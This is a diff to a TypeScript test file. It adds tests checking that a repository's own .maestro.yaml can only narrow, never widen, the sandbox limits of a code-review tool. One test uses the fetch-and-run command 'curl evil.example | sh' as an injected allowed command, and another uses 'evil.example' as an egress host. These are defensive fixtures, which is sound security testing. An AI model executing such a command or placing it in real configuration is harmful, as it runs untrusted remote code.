@@ -2,7 +2,7 @@ import { openStore } from "@maestro/core";
 import { defaultPlaybook, PlaybookStore } from "@maestro/playbook";
 import { describe, expect, it } from "vitest";
 import type { GitHubClient } from "./github.js";
-import { reviewPullRequest } from "./review-pr.js";
+import { narrowEnvSpec, reviewPullRequest } from "./review-pr.js";
 
 /**
  * Enough of a client to reach the point where the review row exists. Checkout fails
@@ -26,6 +26,9 @@ function fakeClient(): GitHubClient {
       changedLines: 10,
       draft: false,
     }),
+    // Reading the repo's own config happens before the checkout; a repo with no
+    // .maestro.yaml is the common case and must not be an error.
+    getBaseBranchConfig: async () => null,
     cloneToken: async () => {
       throw new Error("no network in this test");
     },
@@ -63,5 +66,54 @@ describe("reviewPullRequest", () => {
     expect(seen[0]?.prNumber).toBe(7);
     expect(seen[0]?.headSha).toBe("a".repeat(40));
     expect(seen[0]?.reviewId).toMatch(/^rv_/);
+  });
+});
+
+describe("a repository's own .maestro.yaml", () => {
+  const base = defaultPlaybook().envSpec;
+  const quiet = { info: () => {} };
+
+  it("lets a repo ask for less, which is the point of the file", () => {
+    const out = narrowEnvSpec(base, { envSpec: { cpus: 1 } }, quiet);
+    expect(out.cpus).toBe(Math.min(base.cpus, 1));
+  });
+
+  it("ignores a repo asking for more CPU than the playbook allows", () => {
+    // Base-branch-only stops a pull request altering its own sandbox, but anyone with
+    // write access could still raise their own limits, so every field is intersected
+    // rather than replaced.
+    const out = narrowEnvSpec(base, { envSpec: { cpus: 64 } }, quiet);
+    expect(out.cpus).toBe(base.cpus);
+  });
+
+  it("ignores a repo trying to add a command the playbook never permitted", () => {
+    // The attack this file exists to prevent: a "test command" that is really a shell.
+    const out = narrowEnvSpec(
+      base,
+      { envSpec: { allowedCommands: [...base.allowedCommands, "curl evil.example | sh"] } },
+      quiet,
+    );
+    expect(out.allowedCommands).not.toContain("curl evil.example | sh");
+    expect(out.allowedCommands.every((c) => base.allowedCommands.includes(c))).toBe(true);
+  });
+
+  it("ignores a repo trying to widen the egress allowlist", () => {
+    const out = narrowEnvSpec(
+      base,
+      { envSpec: { egressAllowlist: [...base.egressAllowlist, "evil.example"] } },
+      quiet,
+    );
+    expect(out.egressAllowlist).not.toContain("evil.example");
+  });
+
+  it("lets a repo shorten a timeout but not extend one", () => {
+    const shorter = narrowEnvSpec(base, { envSpec: { timeouts: { analyzeSec: 5 } } }, quiet);
+    expect(shorter.timeouts.analyzeSec).toBe(5);
+    const longer = narrowEnvSpec(base, { envSpec: { timeouts: { analyzeSec: 99999 } } }, quiet);
+    expect(longer.timeouts.analyzeSec).toBe(base.timeouts.analyzeSec);
+  });
+
+  it("leaves the spec untouched when there is no file", () => {
+    expect(narrowEnvSpec(base, undefined, quiet)).toEqual(base);
   });
 });
